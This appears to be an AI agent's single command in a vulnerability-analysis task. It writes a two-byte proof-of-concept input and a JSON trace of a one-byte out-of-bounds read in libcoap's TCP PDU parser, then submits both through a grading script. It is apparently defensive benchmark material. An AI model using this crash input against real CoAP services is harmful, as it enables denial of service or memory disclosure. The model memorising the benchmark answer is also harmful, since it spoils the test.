message:
Running command: printf '\x0d\x01' > /workspace/poc.bin
cat > /workspace/analysis.json <<'JSON'
{
  "sample_id": "osv_ossfuzz_OSV-2026-736",
  "fine_trace": [
    {
      "step": 1,
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse2",
      "line": 1551,
      "var": "data",
      "code": "const uint8_t *data,",
      "role": "source",
      "note": "The fuzzer supplied input bytes enter the PDU parser through the data pointer."
    },
    {
      "step": 2,
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse_header_size",
      "line": 1056,
      "var": "len = *data >> 4",
      "code": "uint8_t len = *data >> 4;",
      "role": "intermediate",
      "note": "The first input byte controls the TCP length-nibble classification; a value with high nibble 0 selects a two-byte header."
    },
    {
      "step": 3,
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse2",
      "line": 1564,
      "var": "length - hdr_size",
      "code": "if (!coap_pdu_resize(pdu, length - hdr_size))",
      "role": "root_cause",
      "note": "For a two-byte input and two-byte TCP header, the PDU is resized to zero bytes after the header, so reading any extended token-length byte requires length - hdr_size to be greater than zero."
    },
    {
      "step": 4,
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse2",
      "line": 1567,
      "var": "memcpy(pdu->token - hdr_size, data, length)",
      "code": "memcpy(pdu->token - hdr_size, data, length);",
      "role": "intermediate",
      "note": "The input header bytes are copied immediately before pdu->token, preserving the attacker-controlled low nibble 13 in hdr[0]."
    },
    {
      "step": 5,
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse_header",
      "line": 1162,
      "var": "e_token_length = hdr[0] & 0x0f",
      "code": "e_token_length = hdr[0] & 0x0f;",
      "role": "intermediate",
      "note": "The copied first byte's low nibble is decoded as the extended one-byte token-length marker."
    },
    {
      "step": 6,
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse_header",
      "line": 1168,
      "var": "pdu->token[0]",
      "code": "pdu->e_token_length = pdu->token[0] + COAP_TOKEN_EXT_1B_BIAS + 1;",
      "role": "sink",
      "note": "With no bytes allocated after pdu->token, dereferencing pdu->token[0] reads one byte past the copied input buffer."
    }
  ],
  "vuln_logic": {
    "source": {
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse2",
      "line": 1551,
      "operands": ["data"]
    },
    "root_cause": {
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse2",
      "line": 1564,
      "operands": ["length - hdr_size", "0"],
      "relation": {"op": "gt", "left": "length - hdr_size", "right": "0"}
    },
    "sink": {
      "file": "src/coap_pdu.c",
      "function": "coap_pdu_parse_header",
      "line": 1168,
      "operands": ["pdu->token[0]", "pdu->alloc_size"],
      "relation": {"op": "lt", "left": "0", "right": "pdu->alloc_size"}
    },
    "propagation": [
      {
        "from": {"file": "src/coap_pdu.c", "function": "coap_pdu_parse2", "line": 1551, "operands": ["data"]},
        "to": {"file": "src/coap_pdu.c", "function": "coap_pdu_parse_header", "line": 1168, "operands": ["pdu->token[0]"]},
        "type": "data",
        "via": ["hdr_size", "memcpy(pdu->token - hdr_size, data, length)", "hdr[0]", "e_token_length"]
      }
    ]
  }
}
JSON
bash /workspace/submit.sh /workspace/poc.bin /workspace/analysis.json
